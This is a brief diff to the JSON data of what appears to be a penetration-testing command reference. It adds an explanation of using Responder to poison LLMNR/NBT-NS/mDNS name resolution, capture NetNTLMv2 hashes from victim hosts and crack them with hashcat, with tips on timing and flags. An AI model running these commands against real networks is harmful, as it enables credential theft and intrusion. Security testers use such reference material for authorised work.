@@ -113,5 +113,6 @@
       "label": "Crack them",
       "command": "hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt"
     }
-  ]
+  ],
+  "explain": "Actively poisons name resolution to capture NetNTLMv2 hashes:\n  sudo responder           the poisoner\n  -I <interface>           answer LLMNR/NBT-NS/mDNS requests on this interface as if you own the name\nHosts that mistype or fail DNS then authenticate to you; captures land in /usr/share/responder/logs/. Run during business hours for volume; crack with hashcat -m 5600. -A is analyze-only, -wv adds WPAD + verbose."
 }
